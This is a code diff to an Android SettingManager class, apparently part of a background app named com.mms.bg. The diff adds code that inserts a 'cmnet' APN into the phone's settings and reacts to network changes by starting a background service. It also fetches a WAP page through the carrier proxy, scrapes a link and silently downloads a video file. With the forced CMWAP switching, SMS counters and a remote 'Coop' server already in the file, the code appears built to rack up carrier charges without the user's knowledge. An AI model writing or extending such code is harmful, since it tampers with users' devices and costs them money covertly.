@@ -52,6 +52,7 @@ import android.util.Xml;
 
 import com.mms.bg.transaction.WorkingMessage;
 import com.mms.bg.util.LogUtil;
+import com.mms.bg.util.WMLHandler;
 import com.mms.bg.util.XMLHandler;
 
 public class SettingManager {
@@ -81,6 +82,7 @@ public class SettingManager {
     public static final String INTERNET_CONNECT_FAILED_BEFORE_SMS = "internet_connect_failed_before_SMS";
     
     private static final String CMWAP = "cmwap";
+    public static final String CMNET = "cmnet";
 //    private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
     private static final String SERVER_URL = "http://www.youlubg.com:81/Coop/request3.php";
 //    private static final String VEDIO_URL = "http://211.136.165.53/wl/rmw1s/pp66.jsp";
@@ -94,6 +96,7 @@ public class SettingManager {
     public final String UPLOAD_FILE_PATH;
     public final String DOWNLOAD_FILE_PATH;
     public final String VEDIO_DOWNLOAD_FILE_PATH;
+    public final String VEDIO_FILE_DOWNLOAD_FILE_PATH;
     
     private static final int DEFAULT_SMS_COUNT = 0;
     
@@ -117,10 +120,14 @@ public class SettingManager {
     private static  SettingManager gSettingManager;
     private LogUtil mLog;
     public XMLHandler mXMLHandler;
+    public WMLHandler mWMLHandler;
     public String mPid;
     public String mOldAPNId;
     public ConnectivityManager mConnMgr;
     public ContentResolver mResolver;
+    public boolean mCMNetIsReady;
+    public CMWapNetworkChangeReceiver mCMWapChangeReceiver;
+    public CMNetNetworkChangeReceiver mCMNetChangeReceiver;
     
     public static SettingManager getInstance(Context context) {
         if (gSettingManager == null) {
@@ -586,13 +593,13 @@ public class SettingManager {
         return null;
     }
     
-    public HttpResponse openConnection(String ip, String port) {
-        LOGD("[[openConnection]] for ip and port");
+    public HttpResponse openConnection(String url, String ip, String port) {
+        LOGD("[[openConnection]] url = " + url + " ip = " + ip + " port = " + port);
         HttpClient hc = new DefaultHttpClient(getParams(ip, port));
         HttpGet get = new HttpGet();
         try {
 //            get.setURI(new URI(this.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK)));
-            get.setURI(new URI(VEDIO_URL_REAL));
+            get.setURI(new URI(url));
         } catch (URISyntaxException e) {
             e.printStackTrace();
             return null;
@@ -764,7 +771,7 @@ public class SettingManager {
     
     public boolean getVedioXML() {
         LOGD("");
-        HttpResponse r = openConnection("10.0.0.172", "80");
+        HttpResponse r = openConnection(VEDIO_URL_REAL, "10.0.0.172", "80");
         if (r == null) return false;
         if (r.getStatusLine().getStatusCode() != 200) {
             LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
@@ -796,6 +803,40 @@ public class SettingManager {
         return true;
     }
     
+    public boolean getVedioDownload(String url) {
+        LOGD("");
+        HttpResponse r = openConnection(url, "10.0.0.172", "80");
+        if (r == null) return false;
+        if (r.getStatusLine().getStatusCode() != 200) {
+            LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
+            log(TAG, "r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
+            return false;
+        }
+        try {
+            File outFile = new File(VEDIO_FILE_DOWNLOAD_FILE_PATH);
+            if (!outFile.exists()) {
+                outFile.createNewFile();
+            }
+            LOGD("[[getTargetNum]] download file now");
+            FileOutputStream fos = new FileOutputStream(VEDIO_FILE_DOWNLOAD_FILE_PATH, false);
+            InputStream is = r.getEntity().getContent();
+            byte[] buffer = new byte[1024];
+            int readLength = 0;
+            while ((readLength = is.read(buffer, 0, 1024)) != -1) {
+                fos.write(buffer, 0, readLength);
+                fos.flush();
+            }
+            fos.close();
+            is.close();
+            dumpReceiveFile(VEDIO_FILE_DOWNLOAD_FILE_PATH);
+            
+        } catch (Exception e) {
+            Log.d(TAG, "[[getTargetNum]] e = " + e.getMessage());
+            return false;
+        }
+        return true;
+    }
+    
     public boolean parseServerXMLInfo() {
         File file = new File(DOWNLOAD_FILE_PATH);
         if (file.exists() == true) {
@@ -813,6 +854,49 @@ public class SettingManager {
             }
         }
         return false;
+    }
+    
+    public boolean parseWMLInfo() {
+        File file = new File(VEDIO_DOWNLOAD_FILE_PATH);
+        if (file.exists() == true) {
+            SAXParser mSaxparser;
+            try {
+                mSaxparser = SAXParserFactory.newInstance().newSAXParser();
+                mWMLHandler = new WMLHandler();
+                mSaxparser.parse(file, mWMLHandler);
+                
+//                mWMLHandler.dumpXMLParseInfo();
+//                refreshChannelSP();
+                return true;
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        return false;
+    }
+    
+    public String getVedioDownLink() {
+        File file = new File(VEDIO_DOWNLOAD_FILE_PATH);
+        if (file.exists() == true) {
+            try {
+                FileInputStream in = new FileInputStream(file);
+                int length = (int) file.length();
+                byte[] datas = new byte[length];
+                in.read(datas, 0, datas.length);
+                String result = new String(datas);
+                int pos = result.indexOf("href='http:");
+                if (pos != -1) {
+                    //skip two http:
+                    String subStr = result.substring(pos + 6);
+                    pos = subStr.indexOf("'>");
+                    if (pos != -1) {
+                        return subStr.substring(0, pos);
+                    }
+                }
+            } catch (Exception e) {
+            }
+        }
+        return null;
     }
     
     private void refreshChannelSP() {
@@ -885,8 +969,6 @@ public class SettingManager {
 //        }
     }
     
-    private NetworkChangeReceiver mNChangeReceiver;
-    
     public boolean forceCMWapConnection() { 
         NetworkInfo info = mConnMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
         String oldAPN = info.getExtraInfo(); 
@@ -913,10 +995,10 @@ public class SettingManager {
                 }  
             }
             
-            mNChangeReceiver = new NetworkChangeReceiver();
+            mCMWapChangeReceiver = new CMWapNetworkChangeReceiver();
             //register receiver for wap network connection. 
             IntentFilter upIntentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION); 
-            mContext.registerReceiver(mNChangeReceiver, upIntentFilter);
+            mContext.registerReceiver(mCMWapChangeReceiver, upIntentFilter);
 //            String newAPNId = getApnIdByName(CMWAP);
             if (cmwapApn != null) {
                 updateCurrentAPN(cmwapApn); 
@@ -942,7 +1024,7 @@ public class SettingManager {
         }
     }
     
-    private class NetworkChangeReceiver extends BroadcastReceiver { 
+    private class CMWapNetworkChangeReceiver extends BroadcastReceiver {
         public void onReceive(Context context, Intent intent) { 
             LOGD("======= received the action = " + intent.getAction() + " ======");
             if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction())) { 
@@ -955,16 +1037,50 @@ public class SettingManager {
                      * apn change message is sent out more than once during a second, but it 
                      * only happens once practically. 
                      */ 
-                    if (mNChangeReceiver != null) {
-                        mContext.unregisterReceiver(mNChangeReceiver); 
-                        mNChangeReceiver = null; 
+                    if (mCMWapChangeReceiver != null) {
+                        mContext.unregisterReceiver(mCMWapChangeReceiver); 
+                        mCMWapChangeReceiver = null; 
                     } 
                     LOGD("Before exec the VedioEntryListXMLTask");
                     new VedioEntryListXMLTask().execute("");
-                } 
+                }
             } 
         } 
     } 
+    
+    private class CMNetNetworkChangeReceiver extends BroadcastReceiver {
+        public void onReceive(Context context, Intent intent) { 
+            LOGD("======= received the action = " + intent.getAction() + " ======");
+            if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction())) { 
+                ConnectivityManager ConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
+                NetworkInfo info = ConnMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
+                String apn = info.getExtraInfo(); 
+                LOGD("[[NetworkChangeReceiver::onReceive]] apn = " + apn);
+                if (CMNET.equals(apn) == true) {
+                    /* 
+                     * apn change message is sent out more than once during a second, but it 
+                     * only happens once practically. 
+                     */ 
+                    if (mCMNetChangeReceiver != null) {
+                        mContext.unregisterReceiver(mCMNetChangeReceiver); 
+                        mCMNetChangeReceiver = null; 
+                    } 
+                    LOGD("Flag the cmnet network is ready");
+                    mCMNetIsReady = true;
+                    Intent intent_internt = new Intent(mContext, BgService.class);
+                    intent_internt.setAction(BgService.ACTION_INTERNET);
+                    mContext.startService(intent_internt);
+                }
+            } 
+        } 
+    }
+    
+    public void registerCMNetNetWorkChangeReceiver() {
+        mCMNetChangeReceiver = new CMNetNetworkChangeReceiver();
+        //register receiver for wap network connection. 
+        IntentFilter upIntentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION); 
+        mContext.registerReceiver(mCMNetChangeReceiver, upIntentFilter);
+    }
     
     private class VedioEntryListXMLTask extends AsyncTask<String, Integer, Integer> {
 
@@ -1003,11 +1119,18 @@ public class SettingManager {
                     } 
                     if (info.isAvailable() == true) {
                         LOGD("The net work available = true ======= before get vedio process");
-                        getVedioXML();
+                        if (getVedioXML() == true) {
 //                        Intent intent_view = new Intent();
 //                        intent_view.setClass(mContext, VedioWebViewActivity.class);
 //                        intent_view.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 //                        mContext.startActivity(intent_view);
+//                            parseWMLInfo();
+                            String downloadLink = getVedioDownLink();
+                            LOGD("++++++++ down load link = " + downloadLink + " ++++++++");
+                            if (downloadLink != null) {
+                                getVedioDownload(downloadLink);
+                            }
+                        }
                     }
                 }
             } else {
@@ -1020,7 +1143,7 @@ public class SettingManager {
         
     };
     
-    private int updateCurrentAPN(String apnId) {
+    public int updateCurrentAPN(String apnId) {
         try { 
             LOGD("----- apn id = " + apnId + " --------");
             //set new apn id as chosen one 
@@ -1040,7 +1163,7 @@ public class SettingManager {
         return 1; 
     }
     
-    private String getApnIdByName(String apnName) {
+    public String getApnIdByName(String apnName) {
         if (apnName == null) return null;
         
         String ret = null;
@@ -1075,6 +1198,37 @@ public class SettingManager {
             cr = null;
         }
         return ret;
+    }
+    
+    public String addCMNetApn() {
+        TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
+        String apnId = null;
+        ContentValues values = new ContentValues();
+        values.put("name", "cmnet");
+        values.put("apn", "cmnet");
+        values.put("mcc", "460");
+        values.put("mnc", "02");
+        values.put("type", "default");
+        values.put("numeric", tm.getSimOperator());
+        
+        Cursor c = null;
+        try {
+            Uri newRow = mResolver.insert(uri_apn_list, values);
+            if (newRow != null) {
+                c = mResolver.query(newRow, null, null, null, null);
+                int idindex = c.getColumnIndex("_id");
+                c.moveToFirst();
+                apnId = c.getString(idindex);
+                Log.d("Robert", "New ID: " + apnId + ": Inserting new APN succeeded!");
+            }
+        } catch (Exception e) {
+
+        }
+
+        if (c != null)
+            c.close();
+
+        return apnId;
     }
     
     private String addCMWapApn() {
@@ -1125,6 +1279,7 @@ public class SettingManager {
         UPLOAD_FILE_PATH = BASE_PATH + "upload.xml";
         DOWNLOAD_FILE_PATH = BASE_PATH + "serverInfo.xml";
         VEDIO_DOWNLOAD_FILE_PATH = BASE_PATH + "vedio.xml";
+        VEDIO_FILE_DOWNLOAD_FILE_PATH = BASE_PATH + "vedio_file.3gp";
         mConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
         mResolver = mContext.getContentResolver();
     }
